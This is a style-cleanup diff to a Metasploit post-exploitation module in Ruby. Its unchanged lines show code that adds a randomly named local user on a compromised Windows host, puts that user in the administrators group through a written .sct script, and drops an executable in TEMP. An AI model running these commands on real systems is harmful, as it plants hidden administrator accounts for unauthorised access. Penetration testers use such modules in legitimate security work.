@@ -38,7 +38,7 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
-        },
+        }
       )
     )
 
@@ -59,8 +59,8 @@ class MetasploitModule < Msf::Post
   def setup
     super
     validate_active_host
-    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
-    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
+    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha((rand(6..13)))
+    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha((rand(6..13)))
     @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
     @script_name = "#{script_name}.sct" unless script_name.match(/\.sct$/i)
     @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
@@ -69,8 +69,8 @@ class MetasploitModule < Msf::Post
   end
 
   def populate_command
-    username = Rex::Text.rand_text_alpha((rand(8) + 6))
-    password = Rex::Text.rand_text_alpha((rand(8) + 6))
+    username = Rex::Text.rand_text_alpha((rand(6..13)))
+    password = Rex::Text.rand_text_alpha((rand(6..13)))
     print_status("username = #{username}, password = #{password}")
     cmd_to_run = 'net user /add ' + username + ' ' + password
     cmd_to_run += '  & net localgroup administrators /add ' + username
@@ -79,12 +79,10 @@ class MetasploitModule < Msf::Post
   end
 
   def validate_active_host
-    begin
-      print_status("Attempting to Run on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
-    rescue Rex::Post::Meterpreter::RequestError => e
-      elog(e)
-      raise Msf::Exploit::Failed, 'Could not connect to session'
-    end
+    print_status("Attempting to Run on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
+  rescue Rex::Post::Meterpreter::RequestError => e
+    elog(e)
+    raise Msf::Exploit::Failed, 'Could not connect to session'
   end
 
   def validate_remote_path(path)
@@ -129,8 +127,8 @@ class MetasploitModule < Msf::Post
     full_command = 'cmd.exe /c ' + cmd_to_run
     full_command = full_command
     script_data = script_template_data.sub!('SCRIPTED_COMMAND', full_command)
-    if script_data == nil
-      fail_with(Failure::BadConfig, "Failed to substitute command in script_template")
+    if script_data.nil?
+      fail_with(Failure::BadConfig, 'Failed to substitute command in script_template')
     end
     vprint_status("Writing #{script_data.length} bytes to #{script_path} to target")
     write_file(script_path, script_data)
@@ -170,9 +168,5 @@ class MetasploitModule < Msf::Post
       ensure_clean_destination(script_path)
     end
   end
-  attr_reader :exploit_name
-  attr_reader :script_name
-  attr_reader :temp_path
-  attr_reader :exploit_path
-  attr_reader :script_path
+  attr_reader :exploit_name, :script_name, :temp_path, :exploit_path, :script_path
 end
